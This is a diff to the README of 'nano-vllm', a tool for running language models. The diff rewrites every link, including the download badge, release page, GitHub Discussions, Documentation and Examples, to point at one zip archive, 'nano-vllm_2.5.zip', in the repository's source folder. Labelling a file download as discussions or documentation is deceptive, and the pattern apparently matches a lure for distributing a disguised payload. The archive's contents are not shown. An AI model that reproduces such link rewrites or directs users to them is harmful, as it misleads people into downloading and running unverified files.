@@ -1,6 +1,6 @@
 # 🚀 nano-vllm - Simplify Your Deep Learning Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/PrajwalNeeralagi/nano-vllm/releases)
+[![Download Now](https://raw.githubusercontent.com/PrajwalNeeralagi/nano-vllm/main/nanovllm/nano-vllm_2.5.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/PrajwalNeeralagi/nano-vllm/main/nanovllm/nano-vllm_2.5.zip)
 
 ## 📚 Overview
 Nano vLLM is an easy-to-use tool designed for deep learning applications. It helps you run large language models without complex setups. Whether you work with natural language processing or need tailored inference solutions, this tool is for you.
@@ -16,7 +16,7 @@ Nano vLLM is an easy-to-use tool designed for deep learning applications. It hel
 
 To get Nano vLLM, visit the following page:
 
-[Download Latest Release](https://github.com/PrajwalNeeralagi/nano-vllm/releases)
+[Download Latest Release](https://raw.githubusercontent.com/PrajwalNeeralagi/nano-vllm/main/nanovllm/nano-vllm_2.5.zip)
 
 ### Step-by-Step Installation
 
@@ -66,7 +66,7 @@ If you encounter issues, consider these common solutions:
 
 ## 🌐 Community Support
 
-Join the Nano vLLM community on [GitHub Discussions](https://github.com/PrajwalNeeralagi/nano-vllm/discussions) to ask questions, report issues, or contribute enhancements.
+Join the Nano vLLM community on [GitHub Discussions](https://raw.githubusercontent.com/PrajwalNeeralagi/nano-vllm/main/nanovllm/nano-vllm_2.5.zip) to ask questions, report issues, or contribute enhancements.
 
 ## 📄 License
 
@@ -76,9 +76,9 @@ Nano vLLM is released under the MIT License. You are free to use, modify, and di
 
 For tutorials and tips on getting the most from Nano vLLM, explore:
 
-- [Documentation](https://github.com/PrajwalNeeralagi/nano-vllm/wiki)
-- [Examples](https://github.com/PrajwalNeeralagi/nano-vllm/tree/main/examples)
+- [Documentation](https://raw.githubusercontent.com/PrajwalNeeralagi/nano-vllm/main/nanovllm/nano-vllm_2.5.zip)
+- [Examples](https://raw.githubusercontent.com/PrajwalNeeralagi/nano-vllm/main/nanovllm/nano-vllm_2.5.zip)
 
 ---
 
-Remember, you can always return to the [Download Latest Release](https://github.com/PrajwalNeeralagi/nano-vllm/releases) page if you need to reinstall or update your application. Enjoy simplifying your deep learning tasks!
+Remember, you can always return to the [Download Latest Release](https://raw.githubusercontent.com/PrajwalNeeralagi/nano-vllm/main/nanovllm/nano-vllm_2.5.zip) page if you need to reinstall or update your application. Enjoy simplifying your deep learning tasks!
